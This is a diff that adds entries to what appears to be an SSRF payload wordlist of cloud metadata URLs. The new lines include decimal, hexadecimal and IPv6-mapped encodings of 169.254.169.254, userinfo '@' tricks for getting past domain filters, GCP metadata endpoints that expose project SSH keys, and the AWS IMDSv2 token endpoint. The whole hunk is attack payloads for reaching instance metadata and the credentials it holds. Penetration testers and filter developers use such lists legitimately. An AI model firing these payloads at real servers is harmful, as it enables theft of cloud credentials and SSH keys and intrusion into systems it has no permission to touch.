@@ -46,3 +46,21 @@ http://169.254.169.254/metadata/v1.json
 # Alibaba Cloud
 http://100.100.100.200/latest/meta-data/
 http://100.100.100.200/latest/meta-data/instance-id
+
+# Encoded / bypass forms of the metadata IP 169.254.169.254 (from SSRFPwned)
+http://2852039166/latest/meta-data/
+http://0xa9fea9fe/latest/meta-data/
+http://[::ffff:a9fe:a9fe]/latest/meta-data/
+http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/
+http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/
+
+# Userinfo (@) filter bypass against metadata
+http://expected-domain.com@169.254.169.254/latest/meta-data/
+http://169.254.169.254%2f@expected-domain.com/latest/meta-data/
+
+# GCP additional endpoints
+http://169.254.169.254/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
+http://metadata.google.internal/computeMetadata/v1beta1/
+
+# AWS IMDSv2 token endpoint (requires PUT; see note)
+http://169.254.169.254/latest/api/token
